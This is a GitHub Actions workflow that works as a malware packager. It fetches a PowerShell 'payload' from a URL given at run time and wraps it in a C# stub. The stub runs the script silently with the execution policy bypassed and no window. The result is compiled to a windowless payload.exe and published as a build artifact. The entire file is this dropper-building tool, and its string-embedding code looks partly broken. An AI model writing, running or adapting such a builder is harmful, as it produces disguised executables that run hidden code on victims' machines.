name: Convert Embedded PowerShell to EXE

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch PowerShell script'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout Repository
    - name: Checkout code
      uses: actions/checkout@v3

    # Step 2: Fetch PowerShell Script
    - name: Fetch PowerShell Script
      shell: powershell
      run: |
        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
        if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }

    # Step 3: Embed PowerShell Code into C# File
    - name: Create C# Code with Embedded PowerShell
      shell: powershell
      run: |
        $psCode = Get-Content -Raw payload.ps1
        $csharpCode = @"
        using System;
        using System.Diagnostics;
        using System.IO;

        class Program
        {
            static void Main()
            {
                string psScript = @\"$psCode\";

                string tempFile = Path.GetTempPath() + "script.ps1";
                File.WriteAllText(tempFile, psScript);

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -File \"{tempFile}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process.Start(psi);
            }
        }
        "@
        Set-Content -Path "Program.cs" -Value $csharpCode

    # Step 4: Compile C# to EXE using CSC (C# Compiler)
    - name: Compile C# to EXE
      shell: cmd
      run: |
        "%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs
        if not exist payload.exe exit /b 1

    # Step 5: Upload the generated EXE
    - name: Upload Executable
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe

